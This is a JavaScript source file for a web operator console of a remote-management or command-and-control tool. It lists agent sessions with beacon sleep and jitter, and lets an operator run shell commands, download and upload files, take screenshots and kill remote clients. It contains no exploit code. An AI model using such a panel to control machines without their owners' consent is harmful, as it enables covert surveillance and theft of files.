/**
 * Minimal RMM web operator UI — REST API + WebSocket event stream.
 */
const STORAGE_KEY = "rmm_api_token";

const state = {
  token: sessionStorage.getItem(STORAGE_KEY) || "",
  sessions: [],
  selectedId: null,
  lastEventId: 0,
  ws: null,
  wsConnected: false,
};

const $ = (sel) => document.querySelector(sel);

async function api(path, options = {}) {
  const headers = {
    Accept: "application/json",
    ...(options.headers || {}),
  };
  if (state.token) {
    headers.Authorization = `Bearer ${state.token}`;
  }
  const res = await fetch(`/api/v1${path}`, { ...options, headers });
  let data = {};
  const text = await res.text();
  if (text) {
    try {
      data = JSON.parse(text);
    } catch {
      data = { error: text };
    }
  }
  return { status: res.status, data };
}

function artifactSrc(url) {
  if (!url) return "";
  const sep = url.includes("?") ? "&" : "?";
  return `${url}${sep}token=${encodeURIComponent(state.token)}`;
}

function show(el) {
  el.classList.remove("hidden");
}
function hide(el) {
  el.classList.add("hidden");
}

function formatTime(iso) {
  try {
    return new Date(iso).toLocaleString();
  } catch {
    return iso;
  }
}

function escapeHtml(s) {
  const d = document.createElement("div");
  d.textContent = s;
  return d.innerHTML;
}

function setWsStatus(connected) {
  state.wsConnected = connected;
  const dot = $("#ws-status");
  dot.classList.toggle("connected", connected);
  dot.title = connected ? "WebSocket connected" : "WebSocket disconnected";
}

function wsUrl() {
  const proto = location.protocol === "https:" ? "wss:" : "ws:";
  const q = new URLSearchParams({
    token: state.token,
  });
  if (state.selectedId) {
    q.set("session", state.selectedId);
  }
  return `${proto}//${location.host}/api/v1/ws?${q}`;
}

function connectWebSocket() {
  disconnectWebSocket();
  if (!state.token) return;

  const ws = new WebSocket(wsUrl());
  state.ws = ws;

  ws.onopen = () => setWsStatus(true);

  ws.onclose = () => {
    setWsStatus(false);
    if (state.token && $("#app").classList.contains("hidden") === false) {
      setTimeout(connectWebSocket, 3000);
    }
  };

  ws.onerror = () => setWsStatus(false);

  ws.onmessage = (ev) => {
    let msg;
    try {
      msg = JSON.parse(ev.data);
    } catch {
      return;
    }
    if (msg.op === "sessions") {
      state.sessions = msg.sessions || [];
      renderSessionList();
      return;
    }
    if (msg.op === "event") {
      if (!state.selectedId || msg.session_id === state.selectedId) {
        appendEvent(msg.event);
      }
      return;
    }
    if (msg.op === "ping") {
      ws.send(JSON.stringify({ op: "pong" }));
    }
  };
}

function disconnectWebSocket() {
  if (state.ws) {
    state.ws.onclose = null;
    state.ws.close();
    state.ws = null;
  }
  setWsStatus(false);
}

function wsSubscribe(sessionId) {
  if (state.ws && state.ws.readyState === WebSocket.OPEN) {
    state.ws.send(JSON.stringify({ op: "subscribe", session_id: sessionId }));
  }
}

// --- Views ---

function showLogin(err = "") {
  hide($("#app"));
  show($("#login"));
  const errEl = $("#login-error");
  errEl.textContent = err;
  errEl.classList.toggle("hidden", !err);
}

function showApp() {
  hide($("#login"));
  show($("#app"));
}

async function connect() {
  const token = $("#token-input").value.trim();
  state.token = token;
  const { status, data } = await api("/health");
  if (status === 401) {
    showLogin("Invalid API token");
    return;
  }
  if (status !== 200) {
    showLogin(data.detail || data.error || `Health check failed (${status})`);
    return;
  }
  sessionStorage.setItem(STORAGE_KEY, token);
  showApp();
  connectWebSocket();
  await refreshSessions();
}

function disconnect() {
  disconnectWebSocket();
  sessionStorage.removeItem(STORAGE_KEY);
  state.token = "";
  state.selectedId = null;
  showLogin();
}

async function refreshSessions() {
  const { status, data } = await api("/sessions");
  if (status === 401) {
    disconnect();
    return;
  }
  if (status !== 200) return;
  state.sessions = data.sessions || [];
  renderSessionList();
}

function renderSessionList() {
  const ul = $("#session-list");
  ul.innerHTML = "";
  for (const s of state.sessions) {
    const li = document.createElement("li");
    li.className =
      "session-item" + (s.id === state.selectedId ? " active" : "");
    li.innerHTML = `
      <div class="id">${escapeHtml(s.id.slice(0, 8))}</div>
      <div class="meta">${escapeHtml(s.username)}@${escapeHtml(s.hostname)}</div>
      <div class="sub">sleep ${s.sleep_seconds}s · jitter ${s.jitter_percent}%</div>
    `;
    li.addEventListener("click", () => selectSession(s.id));
    ul.appendChild(li);
  }
}

async function selectSession(id) {
  state.selectedId = id;
  state.lastEventId = 0;
  renderSessionList();
  const s = state.sessions.find((x) => x.id === id);
  if (!s) return;

  hide($("#empty-state"));
  show($("#console-panel"));

  $("#console-title").textContent = `${s.username}@${s.hostname}`;
  $("#console-detail").textContent = `${s.id} · last seen ${formatTime(s.last_seen)}`;
  $("#sleep-input").value = s.sleep_seconds;
  $("#jitter-input").value = s.jitter_percent;
  $("#output-log").innerHTML = "";

  connectWebSocket();
  wsSubscribe(id);

  const { status, data } = await api(
    `/sessions/${encodeURIComponent(id)}/events?since=0&limit=200`
  );
  if (status === 200) {
    for (const ev of data.events || []) {
      appendEvent(ev);
    }
  }
}

function showEmptyConsole() {
  state.selectedId = null;
  show($("#empty-state"));
  hide($("#console-panel"));
  renderSessionList();
  connectWebSocket();
}

function renderEventBody(ev) {
  const body = String(ev.body || "");
  if (ev.type === "screenshot" && ev.artifact_url) {
    const src = artifactSrc(ev.artifact_url);
    return `<img class="screenshot-preview" src="${escapeHtml(src)}" alt="screenshot">`;
  }
  if (ev.type === "file_upload" && ev.artifact_url) {
    const src = artifactSrc(ev.artifact_url);
    return `${escapeHtml(body)}<br><a class="artifact-link" href="${escapeHtml(src)}" download>Download file</a>`;
  }
  if (ev.artifact_url) {
    const src = artifactSrc(ev.artifact_url);
    return `${escapeHtml(body)}<br><a class="artifact-link" href="${escapeHtml(src)}" target="_blank" rel="noopener">Open artifact</a>`;
  }
  return escapeHtml(body);
}

function appendEvent(ev) {
  if (ev.id <= state.lastEventId) return;
  const log = $("#output-log");
  const block = document.createElement("div");
  block.className = "output-line";
  const cmd = ev.command ? ` » ${ev.command}` : "";
  block.innerHTML = `
    <div class="head">[${ev.id}] ${escapeHtml(ev.type)}${escapeHtml(cmd)} · ${formatTime(ev.timestamp)}</div>
    <div class="body">${renderEventBody(ev)}</div>
  `;
  log.appendChild(block);
  log.scrollTop = log.scrollHeight;
  state.lastEventId = ev.id;
}

async function runCommand(wait) {
  const cmd = $("#command-input").value.trim();
  if (!cmd || !state.selectedId) return;

  const btnRun = $("#btn-run");
  const btnExec = $("#btn-exec");
  btnRun.disabled = true;
  btnExec.disabled = true;

  try {
    if (wait) {
      const { status, data } = await api(
        `/sessions/${encodeURIComponent(state.selectedId)}/exec`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ command: cmd, timeout: 120 }),
        }
      );
      if (status === 408) {
        appendEvent({
          id: state.lastEventId + 1,
          type: "error",
          timestamp: new Date().toISOString(),
          body: "Command timed out (beacon interval may be long)",
          command: cmd,
        });
      } else if (status === 200 && data.event) {
        appendEvent(data.event);
      } else {
        appendEvent({
          id: state.lastEventId + 1,
          type: "error",
          timestamp: new Date().toISOString(),
          body: data.error || `HTTP ${status}`,
          command: cmd,
        });
      }
    } else {
      const { status, data } = await api(
        `/sessions/${encodeURIComponent(state.selectedId)}/commands`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ command: cmd, type: "oneshot" }),
        }
      );
      if (status === 200) {
        appendEvent({
          id: state.lastEventId + 1,
          type: "queued",
          timestamp: new Date().toISOString(),
          body: "Command queued — waiting for agent beacon",
          command: cmd,
        });
      } else {
        appendEvent({
          id: state.lastEventId + 1,
          type: "error",
          timestamp: new Date().toISOString(),
          body: data.error || `HTTP ${status}`,
          command: cmd,
        });
      }
    }
  } finally {
    btnRun.disabled = false;
    btnExec.disabled = false;
  }
}

async function queueDownload() {
  const remote = $("#download-remote").value.trim();
  if (!remote || !state.selectedId) return;
  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/download`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ remote_path: remote }),
    }
  );
  appendEvent({
    id: state.lastEventId + 1,
    type: status === 200 ? "queued" : "error",
    timestamp: new Date().toISOString(),
    body: status === 200 ? `Download queued: ${remote}` : (data.error || `HTTP ${status}`),
    command: `__DOWNLOAD__ ${remote}`,
  });
}

async function queueScreenshot() {
  if (!state.selectedId) return;
  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/screenshot`,
    { method: "POST", headers: { "Content-Type": "application/json" }, body: "{}" }
  );
  appendEvent({
    id: state.lastEventId + 1,
    type: status === 200 ? "queued" : "error",
    timestamp: new Date().toISOString(),
    body: status === 200 ? "Screenshot queued" : (data.error || `HTTP ${status}`),
    command: "__SCREENSHOT__",
  });
}

async function queueUpload() {
  const fileInput = $("#upload-file");
  const remote = $("#upload-remote").value.trim();
  if (!state.selectedId || !fileInput.files?.length || !remote) return;

  const file = fileInput.files[0];
  const buf = await file.arrayBuffer();
  const bytes = new Uint8Array(buf);
  let binary = "";
  for (let i = 0; i < bytes.length; i++) {
    binary += String.fromCharCode(bytes[i]);
  }
  const content_b64 = btoa(binary);

  const { status, data } = await api(
    `/sessions/${encodeURIComponent(state.selectedId)}/upload`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ remote_path: remote, content_b64 }),
    }
  );
  appendEvent({
    id: state.lastEventId + 1,
    type: status === 200 ? "queued" : "error",
    timestamp: new Date().toISOString(),
    body:
      status === 200
        ? `Upload queued: ${file.name} → ${remote}`
        : data.error || `HTTP ${status}`,
    command: `__UPLOAD__ ${remote}`,
  });
  fileInput.value = "";
}

async function killSession() {
  if (!state.selectedId || !confirm("Kill this session? The remote client will exit.")) return;
  const id = state.selectedId;
  const { status } = await api(`/sessions/${encodeURIComponent(id)}`, {
    method: "DELETE",
  });
  if (status === 200) {
    showEmptyConsole();
    await refreshSessions();
  }
}

async function applyConfig() {
  if (!state.selectedId) return;
  const sleep = parseInt($("#sleep-input").value, 10);
  const jitter = parseInt($("#jitter-input").value, 10);
  await api(`/sessions/${encodeURIComponent(state.selectedId)}/config`, {
    method: "PATCH",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ sleep_seconds: sleep, jitter_percent: jitter }),
  });
  await refreshSessions();
}

document.addEventListener("DOMContentLoaded", () => {
  $("#connect-btn").addEventListener("click", connect);
  $("#token-input").addEventListener("keydown", (e) => {
    if (e.key === "Enter") connect();
  });
  $("#disconnect-btn").addEventListener("click", disconnect);
  $("#refresh-btn").addEventListener("click", refreshSessions);
  $("#btn-run").addEventListener("click", () => runCommand(false));
  $("#btn-exec").addEventListener("click", () => runCommand(true));
  $("#btn-kill").addEventListener("click", killSession);
  $("#btn-config").addEventListener("click", applyConfig);
  $("#btn-download").addEventListener("click", queueDownload);
  $("#btn-screenshot").addEventListener("click", queueScreenshot);
  $("#btn-upload").addEventListener("click", queueUpload);
  $("#command-input").addEventListener("keydown", (e) => {
    if (e.key === "Enter" && !e.shiftKey) {
      e.preventDefault();
      runCommand(e.ctrlKey || e.metaKey);
    }
  });

  if (state.token) {
    $("#token-input").value = state.token;
    connect();
  } else {
    showLogin();
  }
});
